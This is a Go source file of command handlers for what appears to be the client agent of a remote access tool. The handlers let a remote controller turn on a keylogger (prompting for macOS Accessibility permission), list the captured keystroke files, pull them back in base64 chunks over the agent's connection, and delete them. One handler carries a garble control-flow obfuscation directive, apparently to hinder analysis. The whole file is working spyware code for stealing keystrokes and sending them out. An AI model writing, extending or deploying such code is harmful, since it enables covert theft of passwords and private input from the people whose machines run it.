package handlers

import (
	"context"
	"encoding/base64"
	"log"
	"time"

	"overlord-client/cmd/agent/runtime"
	"overlord-client/cmd/agent/wire"
)

func waitForKeyloggerPermission(env *runtime.Env, timeout time.Duration) bool {
	if env.Keylogger == nil {
		return false
	}
	deadline := time.Now().Add(timeout)
	for {
		if env.Keylogger.HasPermission() {
			return true
		}
		if time.Now().After(deadline) {
			return false
		}
		time.Sleep(350 * time.Millisecond)
	}
}

// HandleKeylogRequestPermission handles the keylog_request_permission command.
// On macOS it triggers the Accessibility permission prompt and reports back
// whether permission was granted. On other platforms it reports that no
// permission gate exists and the keylogger is already running (or starts it).
func HandleKeylogRequestPermission(ctx context.Context, env *runtime.Env, cmdID string) error {
	if env.Keylogger == nil {
		return wire.WriteMsg(ctx, env.Conn, map[string]interface{}{
			"type":      "keylog_permission_result",
			"commandId": cmdID,
			"granted":   false,
			"reason":    "keylogger_disabled",
		})
	}

	if !env.Keylogger.NeedsPermissionGate() {
		// Non-macOS: keylogger doesn't need an explicit permission gate.
		// Ensure it is running (it should already be) and report granted.
		if !env.Keylogger.IsRunning() {
			if err := env.Keylogger.Start(); err != nil {
				log.Printf("[keylogger] start error: %v", err)
				return wire.WriteMsg(ctx, env.Conn, map[string]interface{}{
					"type":      "keylog_permission_result",
					"commandId": cmdID,
					"granted":   false,
					"reason":    err.Error(),
				})
			}
		}
		return wire.WriteMsg(ctx, env.Conn, map[string]interface{}{
			"type":      "keylog_permission_result",
			"commandId": cmdID,
			"granted":   true,
			"reason":    "no_permission_gate",
		})
	}

	// macOS: trigger the OS accessibility prompt and wait for the result.
	if env.Keylogger.HasPermission() {
		granted := true
		if !env.Keylogger.IsRunning() {
			if err := env.Keylogger.Start(); err != nil {
				log.Printf("[keylogger] start after existing permission check failed: %v", err)
				return wire.WriteMsg(ctx, env.Conn, map[string]interface{}{
					"type":      "keylog_permission_result",
					"commandId": cmdID,
					"granted":   false,
					"reason":    "start_failed: " + err.Error(),
				})
			}
		}
		return wire.WriteMsg(ctx, env.Conn, map[string]interface{}{
			"type":      "keylog_permission_result",
			"commandId": cmdID,
			"granted":   granted,
			"reason":    "granted",
		})
	}

	log.Printf("[keylogger] macOS: requesting accessibility permission")
	granted := env.Keylogger.RequestPermission()
	if !granted {
		granted = waitForKeyloggerPermission(env, 8*time.Second)
	}

	if granted {
		// Start the keylogger now that we have permission.
		if !env.Keylogger.IsRunning() {
			if err := env.Keylogger.Start(); err != nil {
				log.Printf("[keylogger] start after permission grant failed: %v", err)
				return wire.WriteMsg(ctx, env.Conn, map[string]interface{}{
					"type":      "keylog_permission_result",
					"commandId": cmdID,
					"granted":   false,
					"reason":    "start_failed: " + err.Error(),
				})
			}
		}
		log.Printf("[keylogger] macOS accessibility permission granted, keylogger started")
	} else {
		log.Printf("[keylogger] macOS accessibility permission denied")
	}

	reason := "granted"
	if !granted {
		reason = "user_denied"
	}

	return wire.WriteMsg(ctx, env.Conn, map[string]interface{}{
		"type":      "keylog_permission_result",
		"commandId": cmdID,
		"granted":   granted,
		"reason":    reason,
	})
}

const MaxChunkSize = 256 * 1024

func HandleKeylogList(ctx context.Context, env *runtime.Env, cmdID string) error {
	if env.Keylogger == nil {
		return wire.WriteMsg(ctx, env.Conn, map[string]interface{}{
			"type":      "command_result",
			"commandId": cmdID,
			"ok":        false,
			"message":   "Keylogger not initialized",
		})
	}

	env.Keylogger.FlushNow()

	files, err := env.Keylogger.ListFiles()
	if err != nil {
		log.Printf("[keylogger] list error: %v", err)
		return wire.WriteMsg(ctx, env.Conn, map[string]interface{}{
			"type":      "command_result",
			"commandId": cmdID,
			"ok":        false,
			"message":   err.Error(),
		})
	}

	fileInfos := make([]map[string]interface{}, len(files))
	for i, f := range files {
		fileInfos[i] = map[string]interface{}{
			"name": f.Name,
			"size": f.Size,
			"date": f.Date.Format("2006-01-02T15:04:05Z07:00"),
		}
	}

	return wire.WriteMsg(ctx, env.Conn, map[string]interface{}{
		"type":  "keylog_file_list",
		"files": fileInfos,
	})
}

func HandleKeylogRetrieve(ctx context.Context, env *runtime.Env, cmdID string, filename string) error {
	//garble:controlflow block_splits=10 junk_jumps=10 flatten_passes=2
	if env.Keylogger == nil {
		return wire.WriteMsg(ctx, env.Conn, map[string]interface{}{
			"type":      "command_result",
			"commandId": cmdID,
			"ok":        false,
			"message":   "Keylogger not initialized",
		})
	}

	if filename == "" {
		return wire.WriteMsg(ctx, env.Conn, map[string]interface{}{
			"type":      "command_result",
			"commandId": cmdID,
			"ok":        false,
			"message":   "Filename required",
		})
	}

	env.Keylogger.FlushNow()

	data, err := env.Keylogger.ReadFile(filename)
	if err != nil {
		log.Printf("[keylogger] read error: %v", err)
		return wire.WriteMsg(ctx, env.Conn, map[string]interface{}{
			"type":      "command_result",
			"commandId": cmdID,
			"ok":        false,
			"message":   err.Error(),
		})
	}

	if len(data) <= MaxChunkSize {
		content := string(data)
		return wire.WriteMsg(ctx, env.Conn, map[string]interface{}{
			"type":     "keylog_file_content",
			"filename": filename,
			"content":  content,
		})
	}

	totalChunks := (len(data) + MaxChunkSize - 1) / MaxChunkSize
	for i := 0; i < totalChunks; i++ {
		start := i * MaxChunkSize
		end := start + MaxChunkSize
		if end > len(data) {
			end = len(data)
		}

		chunk := data[start:end]
		isLast := i == totalChunks-1

		encoded := base64.StdEncoding.EncodeToString(chunk)

		if err := wire.WriteMsg(ctx, env.Conn, map[string]interface{}{
			"type":      "keylog_file_chunk",
			"filename":  filename,
			"chunk":     i,
			"total":     totalChunks,
			"content":   encoded,
			"isLast":    isLast,
			"isEncoded": true,
		}); err != nil {
			log.Printf("[keylogger] send chunk error: %v", err)
			return err
		}

		if isLast {
			return wire.WriteMsg(ctx, env.Conn, map[string]interface{}{
				"type":     "keylog_file_content",
				"filename": filename,
				"content":  string(data),
			})
		}
	}

	return nil
}

func HandleKeylogClearAll(ctx context.Context, env *runtime.Env, cmdID string) error {
	if env.Keylogger == nil {
		return wire.WriteMsg(ctx, env.Conn, map[string]interface{}{
			"type":      "keylog_clear_result",
			"commandId": cmdID,
			"ok":        false,
			"error":     "Keylogger not initialized",
		})
	}

	err := env.Keylogger.ClearAll()
	if err != nil {
		log.Printf("[keylogger] clear error: %v", err)
		return wire.WriteMsg(ctx, env.Conn, map[string]interface{}{
			"type":      "keylog_clear_result",
			"commandId": cmdID,
			"ok":        false,
			"error":     err.Error(),
		})
	}

	return wire.WriteMsg(ctx, env.Conn, map[string]interface{}{
		"type": "keylog_clear_result",
		"ok":   true,
	})
}

func HandleKeylogDelete(ctx context.Context, env *runtime.Env, cmdID string, filename string) error {
	if env.Keylogger == nil {
		return wire.WriteMsg(ctx, env.Conn, map[string]interface{}{
			"type":      "keylog_delete_result",
			"commandId": cmdID,
			"ok":        false,
			"error":     "Keylogger not initialized",
		})
	}

	if filename == "" {
		return wire.WriteMsg(ctx, env.Conn, map[string]interface{}{
			"type":      "keylog_delete_result",
			"commandId": cmdID,
			"ok":        false,
			"error":     "Filename required",
		})
	}

	if err := env.Keylogger.DeleteFile(filename); err != nil {
		log.Printf("[keylogger] delete error: %v", err)
		return wire.WriteMsg(ctx, env.Conn, map[string]interface{}{
			"type":      "keylog_delete_result",
			"commandId": cmdID,
			"ok":        false,
			"error":     err.Error(),
			"filename":  filename,
		})
	}

	return wire.WriteMsg(ctx, env.Conn, map[string]interface{}{
		"type":     "keylog_delete_result",
		"ok":       true,
		"filename": filename,
	})
}
